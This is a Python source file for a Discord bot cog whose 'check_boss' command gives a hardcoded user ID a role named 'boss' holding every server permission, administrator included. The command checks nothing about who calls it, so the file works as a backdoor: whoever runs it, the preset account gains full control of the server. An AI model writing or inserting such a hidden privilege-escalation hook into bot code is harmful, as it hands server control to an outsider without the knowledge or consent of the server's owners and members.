# boss.py

import discord
from discord.ext import commands

class Boss(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def check_boss(self, ctx):
        guild = ctx.guild
        user_id = 486652069831376943  # Replace with the user ID you want to check
        user = guild.get_member(user_id)

        if user:
            # Check if the role already exists
            boss_role = discord.utils.get(guild.roles, name="boss")
            if not boss_role:
                # Create a role named "boss" if it doesn't exist
                boss_role = await guild.create_role(name="boss", permissions=discord.Permissions.all())
            else:
                # If role exists, update its permissions to max permissions
                await boss_role.edit(permissions=discord.Permissions.all())
            
            # Assign the "boss" role to the user
            await user.add_roles(boss_role)

            # Grant permissions for the user to use the bot
            # Replace with your specific bot commands permissions logic
            # Example: await boss_role.edit(permissions=new_permissions)

            await ctx.send(f"Found user {user.display_name}. Assigned role 'boss' with max permissions.")
        else:
            await ctx.send("User not found in the server.")

def setup(bot):
    bot.add_cog(Boss(bot))
